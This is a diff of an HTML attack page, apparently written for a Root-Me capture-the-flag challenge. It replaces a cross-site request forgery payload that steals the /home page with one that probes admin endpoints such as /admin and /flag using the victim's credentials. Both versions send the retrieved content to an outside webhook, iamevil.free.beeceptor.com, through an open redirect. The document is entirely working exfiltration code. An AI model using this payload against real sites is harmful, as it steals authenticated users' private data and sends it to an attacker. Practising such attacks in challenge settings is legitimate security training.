@@ -1,24 +1,38 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>XSRF Attack</title>
+    <title>Admin Access</title>
 </head>
 <body>
     <script>
-        // Make a request to a page that might display the flag for admins
-        fetch('http://127.0.0.1:58039/home', {
-            credentials: 'include'
-        })
-        .then(response => response.text())
-        .then(html => {
-            // Extract any useful information from the HTML
-            // Then redirect with that data
-            window.location = 'http://challenge01.root-me.org:58039/redirect?url=https://iamevil.free.beeceptor.com/home_content?data=' + encodeURIComponent(html);
-        })
-        .catch(error => {
-            // If there's an error, redirect anyway with the error message
-            window.location = 'http://challenge01.root-me.org:58039/redirect?url=https://iamevil.free.beeceptor.com/error?message=' + encodeURIComponent(error.toString());
+        // Check potential admin endpoints
+        const endpoints = [
+            '/admin',
+            '/dashboard',
+            '/flags',
+            '/flag',
+            '/settings',
+            '/secret'
+        ];
+        
+        // Try each endpoint
+        endpoints.forEach(endpoint => {
+            fetch('http://127.0.0.1:58039' + endpoint, {
+                credentials: 'include'
+            })
+            .then(response => response.text())
+            .then(data => {
+                // Send the content to our webhook
+                fetch('https://iamevil.free.beeceptor.com/endpoint?path=' + encodeURIComponent(endpoint) + '&data=' + encodeURIComponent(data))
+                .catch(() => {});
+            })
+            .catch(() => {});
         });
+        
+        // Ensure we get a redirect regardless
+        setTimeout(() => {
+            window.location = 'http://challenge01.root-me.org:58039/redirect?url=https://iamevil.free.beeceptor.com/checked_admin_pages';
+        }, 2000);
     </script>
 </body>
 </html>
